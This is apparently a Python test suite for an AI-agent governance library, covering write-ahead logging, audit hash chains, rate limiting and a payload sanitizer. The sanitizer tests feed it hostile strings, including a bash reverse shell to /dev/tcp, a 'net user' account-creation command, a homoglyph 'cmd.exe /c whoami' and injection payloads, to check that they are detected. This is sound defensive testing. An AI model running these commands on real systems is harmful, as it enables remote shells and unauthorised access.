"""
Comprehensive test suite covering:
  - WAL SQLite persistence and crash-recovery replay
  - Chaos scenarios (mid-flight crash simulation, Redis unavailability)
  - Property-based tests for sanitizer and velocity breaker
  - Audit timestamp monotonicity enforcement
  - Policy conflict detection warnings
  - VelocityBreaker deque O(k) correctness
  - ReadOnlySnapshot frozenset immutability
  - Pipeline named stage helpers
"""

import gc
import os
import shutil
import sqlite3
import tempfile
import threading
import time
import unittest
import warnings
from collections import deque
from datetime import datetime, timezone


def _safe_unlink(path: str) -> None:
    """Remove a file, ignoring errors caused by Windows file-lock delays."""
    gc.collect()  # encourage SQLite connection finalizers to run
    try:
        os.unlink(path)
    except OSError:
        pass  # Windows may hold the lock briefly; let the OS clean it up

# ── WAL persistence and recovery ──────────────────────────────────────────────

class TestWALPersistenceAndRecovery(unittest.TestCase):
    """Write-Ahead Log: SQLite backend, crash recovery, checkpoint."""

    def _make_audit_record(self):
        from glassbox.governance.models import (
            AuditRecord, DecisionType, DecisionContext,
        )
        ctx = DecisionContext()
        return AuditRecord(
            agent_id="test-agent",
            decision_type=DecisionType.PROCUREMENT,
            payload={"amount": 500},
            context=ctx,
        )

    def test_wal_persists_to_sqlite(self):
        """WAL with db_path writes entries to SQLite on begin_transaction."""
        from glassbox.governance.write_ahead_log import WriteAheadLog, WALEntryState
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
        try:
            wal = WriteAheadLog(db_path=db_path)
            record = self._make_audit_record()
            entry = wal.begin_transaction("decision-001", record)

            # Verify entry exists in SQLite independently of the in-memory cache
            conn = sqlite3.connect(db_path)
            row = conn.execute(
                "SELECT state FROM wal_entries WHERE decision_id = ?", ("decision-001",)
            ).fetchone()
            conn.close()
            self.assertIsNotNone(row, "WAL entry must be written to SQLite")
            self.assertEqual(row[0], WALEntryState.PENDING.value)
        finally:
            _safe_unlink(db_path)

    def test_wal_commit_updates_sqlite(self):
        """WAL commit transitions SQLite row to COMMITTED."""
        from glassbox.governance.write_ahead_log import WriteAheadLog, WALEntryState
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
        try:
            wal = WriteAheadLog(db_path=db_path)
            record = self._make_audit_record()
            entry = wal.begin_transaction("decision-002", record)
            wal.mark_side_effect(entry.entry_id, "audit_saved", success=True)
            wal.commit(entry.entry_id)

            conn = sqlite3.connect(db_path)
            row = conn.execute(
                "SELECT state FROM wal_entries WHERE decision_id = ?", ("decision-002",)
            ).fetchone()
            conn.close()
            self.assertEqual(row[0], WALEntryState.COMMITTED.value)
        finally:
            _safe_unlink(db_path)

    def test_wal_get_pending_entries_returns_uncommitted(self):
        """get_pending_entries() returns PENDING and IN_PROGRESS but not COMMITTED."""
        from glassbox.governance.write_ahead_log import WriteAheadLog
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
        try:
            wal = WriteAheadLog(db_path=db_path)
            record = self._make_audit_record()

            e1 = wal.begin_transaction("dec-pending", record)
            e2 = wal.begin_transaction("dec-committed", record)
            wal.commit(e2.entry_id)

            pending = wal.get_pending_entries()
            decision_ids = [e.decision_id for e in pending]
            self.assertIn("dec-pending", decision_ids)
            self.assertNotIn("dec-committed", decision_ids)
        finally:
            _safe_unlink(db_path)

    def test_wal_crash_recovery_simulation(self):
        """Simulate crash: open fresh WAL on same DB and verify pending entry survives."""
        from glassbox.governance.write_ahead_log import WriteAheadLog, WALEntryState
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
        try:
            # Process A: starts a transaction but crashes before commit
            wal_a = WriteAheadLog(db_path=db_path)
            record = self._make_audit_record()
            e = wal_a.begin_transaction("decision-crash", record)
            wal_a.mark_side_effect(e.entry_id, "audit_saved", success=True)
            # Process A crashes — no commit call

            # Process B: fresh WAL instance (simulating restart) on same DB
            wal_b = WriteAheadLog(db_path=db_path)
            pending = wal_b.get_pending_entries()
            decision_ids = [p.decision_id for p in pending]
            self.assertIn(
                "decision-crash", decision_ids,
                "Crashed in-progress entry must survive and be recoverable after restart",
            )
        finally:
            _safe_unlink(db_path)

    def test_wal_side_effects_tracked_in_sqlite(self):
        """mark_side_effect persists side-effect state to SQLite."""
        from glassbox.governance.write_ahead_log import WriteAheadLog
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
        try:
            wal = WriteAheadLog(db_path=db_path)
            record = self._make_audit_record()
            e = wal.begin_transaction("decision-se", record)
            wal.mark_side_effect(e.entry_id, "audit_saved", success=True)
            wal.mark_side_effect(e.entry_id, "repo_saved", success=False, error_msg="timeout")

            conn = sqlite3.connect(db_path)
            row = conn.execute(
                "SELECT side_effects_json FROM wal_entries WHERE decision_id = ?",
                ("decision-se",),
            ).fetchone()
            conn.close()

            import json
            se = json.loads(row[0])
            self.assertTrue(se["audit_saved"]["success"])
            self.assertFalse(se["repo_saved"]["success"])
            self.assertEqual(se["repo_saved"]["error"], "timeout")
        finally:
            _safe_unlink(db_path)

    def test_wal_rollback_persisted(self):
        """Rolled-back entries are not returned by get_pending_entries."""
        from glassbox.governance.write_ahead_log import WriteAheadLog
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
        try:
            wal = WriteAheadLog(db_path=db_path)
            record = self._make_audit_record()
            e = wal.begin_transaction("decision-rb", record)
            wal.rollback(e.entry_id, reason="test rollback")

            pending = wal.get_pending_entries()
            self.assertNotIn("decision-rb", [p.decision_id for p in pending])
        finally:
            _safe_unlink(db_path)

    def test_wal_memory_mode_still_works(self):
        """WAL without db_path operates in-memory correctly."""
        from glassbox.governance.write_ahead_log import WriteAheadLog, WALEntryState
        wal = WriteAheadLog(db_path=None)
        record = self._make_audit_record()
        e = wal.begin_transaction("mem-001", record)
        self.assertEqual(e.state, WALEntryState.PENDING)
        wal.commit(e.entry_id)
        entry = wal.get_entry(e.entry_id)
        self.assertEqual(entry.state, WALEntryState.COMMITTED)


# ── Audit timestamp monotonicity ──────────────────────────────────────────────

class TestAuditTimestampMonotonicity(unittest.TestCase):
    """TamperEvidentAuditLogger: verify_hash_chain detects out-of-order timestamps."""

    def _logger(self):
        from glassbox.governance.advanced_audit import TamperEvidentAuditLogger
        return TamperEvidentAuditLogger(db_path=":memory:", enable_hash_chain=True)

    def test_valid_chain_passes(self):
        logger = self._logger()
        for i in range(5):
            logger.log_action("user1", f"action_{i}", "resource", f"id_{i}")
        self.assertTrue(logger.verify_hash_chain())

    def test_backdated_timestamp_rejected(self):
        """Manually inserting a backdated record must fail verification."""
        import json
        logger = self._logger()
        logger.log_action("user1", "action_1", "resource", "id_1")
        logger.log_action("user1", "action_2", "resource", "id_2")

        # Inject a backdated record directly into SQLite (simulating out-of-order injection)
        from glassbox.governance.advanced_audit import GENESIS_SENTINEL
        import hashlib
        with logger._get_connection() as conn:
            # Get last record's hash
            last = conn.execute(
                "SELECT id, record_hash FROM audit_records ORDER BY id DESC LIMIT 1"
            ).fetchone()
            backdated_ts = "2000-01-01T00:00:00+00:00"  # Far in the past
            # Insert with a crafted hash to pass content check but fail timestamp check
            conn.execute("""
                INSERT INTO audit_records
                  (timestamp, user_id, action, resource_type, resource_id,
                   result, context, error_message, previous_hash, record_hash, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                backdated_ts, "attacker", "backdated_action", "resource", "id_99",
                "success", "{}", None,
                last["record_hash"],
                "a" * 64,  # fake hash — will fail content check too
                datetime.now(timezone.utc).isoformat(),
            ))
            conn.commit()

        # Chain verification must detect either content hash mismatch or timestamp violation
        result = logger.verify_hash_chain()
        self.assertFalse(result, "Backdated record must fail chain verification")


# ── VelocityBreaker deque correctness ─────────────────────────────────────────

class TestVelocityBreakerDeque(unittest.TestCase):
    """VelocityBreaker: deque-based window cleanup is functionally correct."""

    def _make_breaker(self, max_decisions=5, window_seconds=2):
        from glassbox.governance.velocity_breaker import VelocityBreaker
        return VelocityBreaker(max_decisions=max_decisions, window_seconds=window_seconds)

    def test_window_type_is_deque(self):
        """Internal agent window must be a deque after first check."""
        breaker = self._make_breaker()
        breaker.check("agent-1")
        self.assertIsInstance(
            breaker._agent_windows.get("agent-1"),
            deque,
            "Agent window must be a deque (for O(k) popleft eviction)",
        )

    def test_ecosystem_window_type_is_deque(self):
        from glassbox.governance.velocity_breaker import VelocityBreaker
        breaker = VelocityBreaker(max_decisions=5, ecosystem_max=10)
        breaker.check("agent-1")
        self.assertIsInstance(
            breaker._ecosystem_window,
            deque,
            "Ecosystem window must be a deque",
        )

    def test_rate_limiting_still_works(self):
        """Core rate-limiting behavior unchanged after deque refactor."""
        breaker = self._make_breaker(max_decisions=3, window_seconds=60)
        for _ in range(3):
            triggered, _, _ = breaker.check("agent-x")
            self.assertFalse(triggered)
        triggered, reason, _ = breaker.check("agent-x")
        self.assertTrue(triggered)
        self.assertIn("agent-x", reason)

    def test_expired_entries_evicted(self):
        """Entries outside the window are evicted — agent is un-rate-limited after window."""
        from glassbox.governance.velocity_breaker import VelocityBreaker

        class FastBreaker(VelocityBreaker):
            _fake_now = time.monotonic()

            @staticmethod
            def _now():
                return FastBreaker._fake_now

        breaker = FastBreaker(max_decisions=2, window_seconds=1, cooldown_seconds=0)
        breaker.check("a")
        breaker.check("a")
        triggered, _, _ = breaker.check("a")
        self.assertTrue(triggered, "Should be rate-limited at window boundary")

        # Advance clock past window + cooldown
        FastBreaker._fake_now += 2.0
        triggered, _, _ = breaker.check("a")
        self.assertFalse(triggered, "Should be allowed after window expiry")

    def test_concurrent_checks_no_race(self):
        """Concurrent checks from multiple threads must not corrupt deque state."""
        from glassbox.governance.velocity_breaker import VelocityBreaker
        breaker = VelocityBreaker(max_decisions=1000, window_seconds=60)
        errors = []

        def _worker():
            try:
                for _ in range(50):
                    breaker.check("concurrent-agent")
            except Exception as exc:
                errors.append(exc)

        threads = [threading.Thread(target=_worker) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(errors, [], f"Thread safety violation: {errors}")


# ── ReadOnlySnapshot frozenset immutability ───────────────────────────────────

class TestReadOnlySnapshotFrozenFields(unittest.TestCase):
    """ReadOnlySnapshot._frozen_fields must be a frozenset (immutable)."""

    def _make_snapshot(self, data=None):
        from glassbox.governance.policy_engine import ReadOnlySnapshot
        return ReadOnlySnapshot(data or {"amount": 100, "supplier": "ACME"})

    def test_frozen_fields_is_frozenset(self):
        snap = self._make_snapshot()
        frozen = object.__getattribute__(snap, "_frozen_fields")
        self.assertIsInstance(
            frozen, frozenset,
            "_frozen_fields must be a frozenset to prevent post-construction mutation",
        )

    def test_read_access_works(self):
        snap = self._make_snapshot({"amount": 500})
        self.assertEqual(snap["amount"], 500)
        self.assertEqual(snap.get("amount"), 500)
        self.assertIn("amount", snap)

    def test_write_raises_type_error(self):
        snap = self._make_snapshot()
        with self.assertRaises(TypeError):
            snap["amount"] = 9999

    def test_attribute_write_raises_type_error(self):
        snap = self._make_snapshot()
        with self.assertRaises(TypeError):
            snap.amount = 9999

    def test_nested_dict_is_read_only(self):
        from glassbox.governance.policy_engine import ReadOnlySnapshot
        snap = ReadOnlySnapshot({"meta": {"key": "value"}})
        inner = snap["meta"]
        with self.assertRaises((TypeError, KeyError)):
            inner["key"] = "hacked"  # type: ignore[index]

    def test_to_dict_returns_mutable_copy(self):
        snap = self._make_snapshot({"x": 1})
        d = snap.to_dict()
        d["x"] = 99
        self.assertEqual(snap["x"], 1, "to_dict() must not expose the internal reference")

    def test_snapshot_pattern_helper(self):
        from glassbox.governance.policy_engine import SnapshotPattern
        data = {"price": 200, "quantity": 5}
        snap = SnapshotPattern.readonly_view(data, fields={"price"})
        frozen = object.__getattribute__(snap, "_frozen_fields")
        self.assertIsInstance(frozen, frozenset)


# ── Policy conflict detection ─────────────────────────────────────────────────

class TestPolicyConflictDetection(unittest.TestCase):
    """PolicyEngine.register() emits UserWarning on intent conflicts."""

    def _engine(self):
        from glassbox.governance.policy_engine import PolicyEngine
        return PolicyEngine(policies=[])

    def _policy(self, pid, name, decision_types=None):
        from glassbox.governance.policy_engine import Policy
        from glassbox.governance.models import DecisionType
        dt = decision_types or [DecisionType.PROCUREMENT]
        return Policy(policy_id=pid, policy_name=name, decision_types=dt, rule=lambda p, c: None)

    def test_no_warning_for_non_conflicting_policies(self):
        engine = self._engine()
        p1 = self._policy("P-001", "Budget Check")
        p2 = self._policy("P-002", "Category Validator")
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            engine.register(p1)
            engine.register(p2)
        conflict_warnings = [x for x in w if issubclass(x.category, UserWarning) and "conflict" in str(x.message).lower()]
        self.assertEqual(len(conflict_warnings), 0)

    def test_warning_emitted_for_block_allow_conflict(self):
        engine = self._engine()
        p1 = self._policy("P-001", "Block High Risk Procurement")
        p2 = self._policy("P-002", "Allow Preferred Supplier Procurement")
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            engine.register(p1)
            engine.register(p2)
        conflict_warnings = [x for x in w if issubclass(x.category, UserWarning)]
        self.assertGreater(len(conflict_warnings), 0, "Should warn on block/allow conflict")
        self.assertIn("conflict", str(conflict_warnings[0].message).lower())

    def test_no_warning_different_decision_types(self):
        """Conflicts are only flagged when decision_types overlap."""
        from glassbox.governance.models import DecisionType
        engine = self._engine()
        p1 = self._policy("P-001", "Block Procurement", [DecisionType.PROCUREMENT])
        p2 = self._policy("P-002", "Allow Financial", [DecisionType.FINANCIAL])
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            engine.register(p1)
            engine.register(p2)
        conflict_warnings = [x for x in w if issubclass(x.category, UserWarning)]
        self.assertEqual(len(conflict_warnings), 0, "No conflict: different decision types")

    def test_warn_conflicts_false_suppresses_warning(self):
        engine = self._engine()
        p1 = self._policy("P-001", "Block All Procurement")
        p2 = self._policy("P-002", "Allow Approved Procurement")
        engine.register(p1)
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always")
            engine.register(p2, warn_conflicts=False)
        conflict_warnings = [x for x in w if issubclass(x.category, UserWarning)]
        self.assertEqual(len(conflict_warnings), 0, "warn_conflicts=False must suppress")


# ── PayloadSanitizer enhancements ─────────────────────────────────────────────

class TestPayloadSanitizerEnhancements(unittest.TestCase):
    """New blocked keywords, encoding bypass detection, NFKD homoglyph detection."""

    def _sanitizer(self):
        from glassbox.security.sanitizer import PayloadSanitizer
        return PayloadSanitizer()

    def test_pickle_loads_blocked(self):
        san = self._sanitizer()
        report = san.check({"cmd": "pickle.loads(data)"})
        categories = {f.category for f in report.findings}
        self.assertIn("blocked_keyword", categories)

    def test_dev_tcp_blocked(self):
        san = self._sanitizer()
        report = san.check({"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"})
        categories = {f.category for f in report.findings}
        self.assertTrue(
            "blocked_keyword" in categories or "script_injection" in categories,
            f"Expected blocked_keyword or script_injection, got {categories}",
        )

    def test_homoglyph_cyrillic_detected(self):
        """
        A string containing Cyrillic look-alike characters must trigger at least
        one security finding.  Unicode normalization (NFKC/NFKD) does NOT
        transliterate between scripts, so the detection path is either:
          - unicode_anomaly (NFKC != original) for fullwidth/ligature variants, OR
          - blocked_keyword on the raw or normalised lower-case form (e.g. 'whoami'), OR
          - script_injection via regex patterns.
        Any of those is acceptable — the payload must not be silently passed through.
        """
        san = self._sanitizer()
        # Cyrillic 'с' (U+0441) looks identical to Latin 'c' visually.
        # The string also contains 'whoami' (a blocked keyword) so at minimum
        # blocked_keyword must fire.
        report = san.check({"cmd": "сmd.exe /c whoami"})
        self.assertGreater(
            len(report.findings), 0,
            "Payload with look-alike Cyrillic chars must produce at least one security finding",
        )

    def test_fullwidth_unicode_triggers_unicode_anomaly(self):
        """Fullwidth ASCII (e.g. Ａ) normalises differently under NFKC and triggers unicode_anomaly."""
        san = self._sanitizer()
        # U+FF21 FULLWIDTH LATIN CAPITAL LETTER A — NFKC normalises to 'A'
        fullwidth = "ｅｖａｌ"  # ｅｖａｌ fullwidth
        report = san.check({"identifier": fullwidth})
        categories = {f.category for f in report.findings}
        self.assertIn(
            "unicode_anomaly", categories,
            f"Fullwidth Unicode chars must trigger unicode_anomaly. Got: {categories}",
        )

    def test_long_base64_flagged_as_encoding_bypass(self):
        """A long base64 blob triggers encoding_bypass finding."""
        import base64
        san = self._sanitizer()
        payload_b64 = base64.b64encode(b"A" * 80).decode()
        report = san.check({"data": payload_b64})
        categories = {f.category for f in report.findings}
        self.assertIn(
            "encoding_bypass", categories,
            f"Long base64 blob should trigger encoding_bypass. Got: {categories}",
        )

    def test_percent_encoded_sequence_flagged(self):
        """Heavy percent-encoding triggers encoding_bypass."""
        san = self._sanitizer()
        encoded = "%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"
        report = san.check({"html": encoded})
        categories = {f.category for f in report.findings}
        self.assertIn("encoding_bypass", categories)

    def test_safe_payload_has_no_findings(self):
        san = self._sanitizer()
        report = san.check({
            "supplier": "ACME Corp",
            "amount": 1500,
            "category": "office_supplies",
        })
        high_or_critical = [f for f in report.findings if f.severity in ("critical", "high")]
        self.assertEqual(high_or_critical, [])
        self.assertFalse(report.blocked)

    def test_new_blocked_keywords_net_user(self):
        san = self._sanitizer()
        report = san.check({"cmd": "net user hacker P@ss /add"})
        categories = {f.category for f in report.findings}
        self.assertIn("blocked_keyword", categories)

    def test_null_byte_still_critical(self):
        san = self._sanitizer()
        report = san.check({"field": "normal\x00injected"})
        severities = {f.severity for f in report.findings}
        self.assertIn("critical", severities)
        self.assertTrue(report.blocked)


# ── Pipeline named stage helpers ──────────────────────────────────────────────

class TestPipelineNamedStageHelpers(unittest.TestCase):
    """_stage_circuit_breakers, _stage_policy_and_risk, _stage_disposition exist and work."""

    def _make_pipeline(self):
        from glassbox.governance.pipeline import GovernancePipeline
        return GovernancePipeline(environment="testing")

    def _make_request(self, amount=500):
        from glassbox.governance.models import DecisionRequest, DecisionType, DecisionContext
        return DecisionRequest(
            agent_id="test-agent",
            decision_type=DecisionType.PROCUREMENT,
            payload={"amount": amount, "supplier_id": "SUP-001"},
            context=DecisionContext(),
        )

    def test_stage_circuit_breakers_exists(self):
        pipeline = self._make_pipeline()
        self.assertTrue(
            hasattr(pipeline, "_stage_circuit_breakers"),
            "_stage_circuit_breakers named stage method must exist",
        )

    def test_stage_policy_and_risk_exists(self):
        pipeline = self._make_pipeline()
        self.assertTrue(hasattr(pipeline, "_stage_policy_and_risk"))

    def test_stage_disposition_exists(self):
        pipeline = self._make_pipeline()
        self.assertTrue(hasattr(pipeline, "_stage_disposition"))

    def test_circuit_breaker_stage_returns_not_triggered_for_normal(self):
        pipeline = self._make_pipeline()
        req = self._make_request()
        cb_triggered, cb_name, cb_reason, is_eco, vel_count, anom_score, anom_fields = (
            pipeline._stage_circuit_breakers("test-agent", req, None, req.payload, None, None)
        )
        self.assertFalse(cb_triggered, "Normal request should not trigger circuit breaker")

    def test_policy_and_risk_stage_returns_results(self):
        from glassbox.governance.models import PolicyResult, RiskResult, DecisionContext
        pipeline = self._make_pipeline()
        req = self._make_request(amount=100)
        ctx = DecisionContext()
        policy_result, risk_result = pipeline._stage_policy_and_risk(
            req, None, req.payload, ctx, None, None,
        )
        self.assertIsInstance(policy_result, PolicyResult)
        self.assertIsInstance(risk_result, RiskResult)

    def test_full_pipeline_process_still_works(self):
        """End-to-end: refactored pipeline still produces a valid response."""
        from glassbox.governance.models import FinalStatus
        pipeline = self._make_pipeline()
        req = self._make_request(amount=100)
        response = pipeline.process(req)
        self.assertIn(response.final_status, [FinalStatus.EXECUTED, FinalStatus.PENDING_REVIEW])
        self.assertIsNotNone(response.decision_id)

    def test_pipeline_blocks_on_policy_violation(self):
        from glassbox.governance.models import FinalStatus, DecisionRequest, DecisionType, DecisionContext
        pipeline = self._make_pipeline()
        req = DecisionRequest(
            agent_id="test-agent",
            decision_type=DecisionType.PROCUREMENT,
            payload={"amount": 9_999_999, "supplier_id": "SUP-001"},
            context=DecisionContext(),
        )
        response = pipeline.process(req)
        self.assertEqual(response.final_status, FinalStatus.BLOCKED)


# ── Chaos scenarios ───────────────────────────────────────────────────────────

class TestChaosScenarios(unittest.TestCase):
    """Fault injection: simulate mid-flight failures in side effects."""

    def _make_request(self, amount=200):
        from glassbox.governance.models import DecisionRequest, DecisionType, DecisionContext
        return DecisionRequest(
            agent_id="chaos-agent",
            decision_type=DecisionType.PROCUREMENT,
            payload={"amount": amount, "supplier_id": "SUP-CHAOS"},
            context=DecisionContext(),
        )

    def test_pipeline_continues_when_event_bus_raises(self):
        """A crashing event_bus must not propagate to caller — pipeline stays resilient."""
        from glassbox.governance.pipeline import GovernancePipeline
        from glassbox.governance.models import FinalStatus

        class _BrokenBus:
            def publish(self, *a, **kw):
                raise RuntimeError("event bus is down")

        pipeline = GovernancePipeline(
            environment="testing",
            event_bus=_BrokenBus(),
        )
        req = self._make_request()
        # Should not raise — resilient event dispatcher absorbs failures
        try:
            response = pipeline.process(req)
            self.assertIsNotNone(response.decision_id)
        except Exception as exc:
            self.fail(f"Pipeline raised on broken event_bus: {exc}")

    def test_pipeline_continues_when_audit_repo_raises(self):
        """A crashing audit_repo in best_effort mode must not abort the pipeline."""
        from glassbox.governance.pipeline import GovernancePipeline
        from glassbox.governance.models import FinalStatus

        class _BrokenRepo:
            def save(self, *a, **kw):
                raise RuntimeError("DB connection lost")

        pipeline = GovernancePipeline(
            environment="testing",
            audit_repo=_BrokenRepo(),
            side_effect_mode="best_effort",
        )
        req = self._make_request()
        try:
            response = pipeline.process(req)
            self.assertIsNotNone(response.decision_id)
        except Exception as exc:
            self.fail(f"Pipeline raised on broken audit_repo in best_effort mode: {exc}")

    def test_velocity_breaker_with_many_concurrent_agents(self):
        """50 agents × 20 concurrent decisions must not deadlock or corrupt state."""
        from glassbox.governance.velocity_breaker import VelocityBreaker
        breaker = VelocityBreaker(max_decisions=1000, window_seconds=60)
        errors = []
        results = []

        def _agent_work(agent_id):
            try:
                for _ in range(20):
                    triggered, _, count = breaker.check(agent_id)
                    results.append((agent_id, triggered, count))
            except Exception as exc:
                errors.append(exc)

        threads = [threading.Thread(target=_agent_work, args=(f"agent-{i}",)) for i in range(50)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(errors, [], f"Concurrency errors: {errors}")
        self.assertEqual(len(results), 50 * 20)

    def test_wal_concurrent_transactions(self):
        """Multiple threads begin/commit WAL transactions without corruption."""
        from glassbox.governance.write_ahead_log import WriteAheadLog, WALEntryState
        from glassbox.governance.models import AuditRecord, DecisionType, DecisionContext

        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
        try:
            wal = WriteAheadLog(db_path=db_path)
            errors = []

            def _worker(tid):
                try:
                    ctx = DecisionContext()
                    record = AuditRecord(
                        agent_id=f"agent-{tid}",
                        decision_type=DecisionType.PROCUREMENT,
                        payload={"amount": tid * 100},
                        context=ctx,
                    )
                    entry = wal.begin_transaction(f"decision-{tid}", record)
                    wal.mark_side_effect(entry.entry_id, "audit_saved", success=True)
                    wal.commit(entry.entry_id)
                except Exception as exc:
                    errors.append(exc)

            threads = [threading.Thread(target=_worker, args=(i,)) for i in range(20)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()

            self.assertEqual(errors, [], f"WAL concurrent errors: {errors}")

            # All entries should be committed
            stats = wal.stats()
            self.assertEqual(stats.get("state_counts", {}).get("COMMITTED", 0), 20)
        finally:
            _safe_unlink(db_path)


# ── Property-based tests (no hypothesis required — manual fuzzing) ─────────────

class TestSanitizerPropertyInvariants(unittest.TestCase):
    """
    Invariant tests that simulate property-based testing without the
    hypothesis library. Each test verifies a structural invariant across
    a range of inputs.
    """

    def _sanitizer(self):
        from glassbox.security.sanitizer import PayloadSanitizer
        return PayloadSanitizer()

    def test_check_never_raises_for_arbitrary_string_payloads(self):
        """check() must return a SecurityReport (not raise) for any string payload."""
        san = self._sanitizer()
        test_strings = [
            "",
            "a" * 10_000,
            "\x00\x01\x02",
            "SELECT * FROM users",
            "<script>alert(1)</script>",
            "正常なテキスト",
            "𐏿",  # surrogate pairs
            "\n\r\t" * 100,
        ]
        for s in test_strings:
            try:
                report = san.check({"field": s})
                self.assertIsInstance(report.blocked, bool)
            except Exception as exc:
                self.fail(f"check() raised for input {s!r}: {exc}")

    def test_check_always_returns_clean_payload_or_none(self):
        """clean_payload is either a dict or None — never something else."""
        san = self._sanitizer()
        for payload in [
            {"x": 1},
            {"x": "safe string"},
            {"a": {"b": {"c": "deep"}}},
            {},
        ]:
            report = san.check(payload)
            self.assertIn(
                type(report.clean_payload), (dict, type(None)),
                f"clean_payload type wrong for payload {payload}",
            )

    def test_blocked_implies_no_clean_payload(self):
        """When blocked=True, clean_payload must be None."""
        san = self._sanitizer()
        blocked_payloads = [
            {"cmd": "cmd.exe /c whoami"},
            {"x": "SELECT * FROM users WHERE 1=1"},
            {"data": "\x00hidden"},
        ]
        for payload in blocked_payloads:
            report = san.check(payload)
            if report.blocked:
                self.assertIsNone(
                    report.clean_payload,
                    f"clean_payload must be None when blocked=True. Payload: {payload}",
                )

    def test_velocity_breaker_count_monotonically_increases(self):
        """window_count must be non-decreasing until the window is exceeded."""
        from glassbox.governance.velocity_breaker import VelocityBreaker
        breaker = VelocityBreaker(max_decisions=100, window_seconds=60)
        prev_count = 0
        for i in range(10):
            triggered, _, count = breaker.check("prop-agent")
            if not triggered:
                self.assertGreaterEqual(count, prev_count)
                prev_count = count


if __name__ == "__main__":
    unittest.main()
